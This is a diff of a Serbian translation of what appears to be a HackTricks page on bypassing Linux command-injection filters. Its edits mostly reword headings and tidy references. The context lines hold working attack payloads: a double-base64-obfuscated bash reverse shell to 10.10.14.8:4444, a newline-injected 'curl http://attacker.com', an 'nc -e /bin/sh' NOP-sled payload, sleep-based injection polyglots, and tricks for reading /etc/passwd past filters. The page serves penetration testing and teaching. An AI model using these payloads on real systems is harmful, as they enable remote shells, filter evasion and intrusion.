@@ -10,7 +10,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Kratki Rev shell
+### Kratak Rev shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Zaobilaženje putanja i zabranjenih reči
+### Bypass putanja i zabranjenih reči
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -105,7 +105,7 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Zaobilaženje backslash i slash znakova
+### Zaobilaženje obrnute kose crte i kose crte
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -129,22 +129,22 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Vremenski zasnovana eksfiltracija podataka
+### Eksfiltracija podataka zasnovana na vremenu
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Dobijanje znakova iz Env promenljivih
+### Dobijanje znakova iz Env Variables
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS eksfiltracija podataka
+### DNS data exfiltration
 
 Na primer, možete koristiti **burpcollab** ili [**pingb**](http://pingb.in).
 
 ### Builtins
 
-U slučaju da ne možete da izvršavate eksterne funkcije i imate pristup samo **ograničenom skupu builtins za dobijanje RCE**, postoji nekoliko korisnih trikova. Obično **nećete moći da koristite sve** **builtins**, zato bi trebalo da **poznajete sve svoje opcije** kako biste pokušali da zaobiđete jail. Ideja potiče od [**devploit**](https://twitter.com/devploit).\
+Ako ne možete da izvršavate eksterne funkcije i imate pristup samo **ograničenom skupu builtins za dobijanje RCE**, postoje neki korisni trikovi za to. Obično **nećete moći da koristite sve** **builtins**, zato bi trebalo da **znate sve svoje opcije** kako biste pokušali da zaobiđete jail. Ideja potiče od [**devploit**](https://twitter.com/devploit).\
 Pre svega proverite sve [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Zatim su ovde neke **preporuke**:
 ```bash
 # Get list of builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Zaobilaženje potencijalnih regex izraza
+### Zaobilaženje potencijalnih regexa
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -259,7 +259,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### RCE sa 4 karaktera
+### RCE sa 4 znaka
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -298,13 +298,11 @@ ln /f*
 
 Ako se nalazite unutar filesystem-a sa **read-only i noexec zaštitama** ili čak u distroless container-u, i dalje postoje načini da **izvršite proizvoljne binarne fajlove, čak i shell!:**
 
-
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
 ## Chroot & other Jails Bypass
-
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -312,31 +310,30 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Kada vam vulnerability omogućava delimičnu kontrolu argumenta koji na kraju stiže do `system()` ili drugog shell-a, možda nećete znati tačan offset na kojem execution počinje da čita vaš payload. Tradicionalni NOP sled-ovi (npr. `\x90`) **ne rade** u shell sintaksi, ali Bash bezopasno ignoriše početni whitespace pre izvršavanja komande.
+Kada vam ranjivost omogućava delimičnu kontrolu argumenta koji na kraju dospeva do `system()` ili drugog shell-a, možda nećete znati tačan offset na kojem izvršavanje počinje da čita vaš payload. Tradicionalni NOP sled-ovi (npr. `\x90`) **ne funkcionišu u shell sintaksi**, ali Bash bezopasno ignoriše početni whitespace pre izvršavanja komande.
 
-Zato možete napraviti *NOP sled za Bash* tako što ćete svoju stvarnu komandu prefiksovati dugim nizom razmaka ili tab karaktera:
+Zato možete napraviti *NOP sled za Bash* tako što ćete svoju stvarnu komandu prefiksovati dugim nizom razmaka ili tab karaktera:<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Ako ROP chain (ili bilo koji memory-corruption primitive) postavi instruction pointer bilo gde unutar bloka razmaka, Bash parser jednostavno preskače razmake dok ne dođe do `nc`, pouzdano izvršavajući vašu komandu.
+Ako ROP chain (ili bilo koji memory-corruption primitive) postavi instruction pointer bilo gde unutar bloka razmaka, Bash parser jednostavno preskače razmak dok ne dođe do `nc`, pouzdano izvršavajući vašu komandu.
 
 Praktični slučajevi upotrebe:
 
-1. **Memory-mapped configuration blobs** (npr. NVRAM) kojima može pristupati više procesa.
-2. Situacije u kojima attacker ne može da upisuje NULL bytes radi poravnanja payload-a.
+1. **Memory-mapped configuration blobs** (npr. NVRAM) kojima se može pristupiti iz više procesa.
+2. Situacije u kojima attacker ne može da upisuje NULL bajtove radi poravnanja payload-a.
 3. Embedded uređaji na kojima je dostupan samo BusyBox `ash`/`sh` – oni takođe ignorišu vodeće razmake.
 
 > 🛠️  Kombinujte ovaj trik sa ROP gadgets koji pozivaju `system()` da biste značajno povećali pouzdanost exploit-a na IoT ruterima sa ograničenom memorijom.
 
-## Reference i još sadržaja
+## Reference
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [Iskorišćavanje zero days u napuštenom hardware-u – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
